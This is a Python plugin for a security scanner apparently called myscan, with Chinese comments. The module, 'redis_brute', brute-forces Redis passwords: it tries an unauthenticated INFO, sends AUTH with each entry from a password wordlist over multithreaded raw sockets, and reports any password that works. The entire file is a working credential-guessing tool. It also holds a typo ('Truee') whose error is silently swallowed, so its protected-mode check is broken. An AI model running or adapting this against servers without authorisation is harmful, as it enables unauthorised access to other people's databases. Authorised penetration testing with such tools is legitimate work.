# !/usr/bin/env python3
# @Time    : 2020-07-14
# @Author  : caicai
# @File    : __template.py


# 此脚本为编写perserver的poc模板，编写poc时复制一份此模版为pocname即可，用户可在verify方法下添加自己代码


from myscan.lib.hostscan.pocbase import PocBase
from myscan.lib.core.data import paths, cmd_line_options,logger
from myscan.lib.hostscan.common import get_data_from_file
from myscan.lib.core.threads import mythread
import os, socket


class POC(PocBase):
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详见 Class3-hostscan开发指南.md
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.addr = self.dictdata.get("addr")  # type:str
        self.port = self.dictdata.get("port")  # type:int
        # 以下根据实际情况填写
        self.name = "redis_brute"
        self.vulmsg = "redis weak pass"
        self.level = 2  # 0:Low  1:Medium 2:High
        self.require = {
            "service": ["redis"],
            "type": "tcp"
        }
        # 自定义
        self.right_pwd = None
        self.is_protected=False

    def verify(self):
        if not self.check_rule(self.dictdata, self.require):  # 检查是否满足测试条件
            return
        pwdfile = os.path.join("brute", "redis_pass")
        pwds = [None]
        pwds += get_data_from_file(os.path.join(paths.MYSCAN_DATA_PATH, pwdfile))
        mythread(self.crack_redis, pwds, cmd_line_options.threads)
        if self.right_pwd is not None:
            self.result.append({
                "name": self.name,
                "url": "tcp://{}:{}".format(self.addr, self.port),
                "level": self.level,  # 0:Low  1:Medium 2:High
                "detail": {
                    "vulmsg": self.vulmsg,
                    "password": self.right_pwd
                }
            })

    def crack_redis(self, pwd):
        if self.right_pwd is None and self.is_protected is False:
            logger.debug("test redis_brute pwd:{}".format(pwd))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.settimeout(5)
                s.connect((self.addr, self.port))
                if pwd is None:
                    s.send("INFO\r\n".encode())
                    result = s.recv(1024)
                    # print("pwd:{} recv:{}".format(pwd,result))
                    if b"redis_version" in result:
                        self.right_pwd = str(pwd)
                else:
                    s.send(("AUTH %s\r\n" % (pwd)).encode())
                    result = s.recv(1024)
                    # print("pwd:{} recv:{}".format(pwd,result))
                    if b'+OK' in result:
                        self.right_pwd = pwd
                if b"running in protected" in result:
                    self.is_protected=Truee
            except Exception as ex:
                pass
            finally:
                s.close()
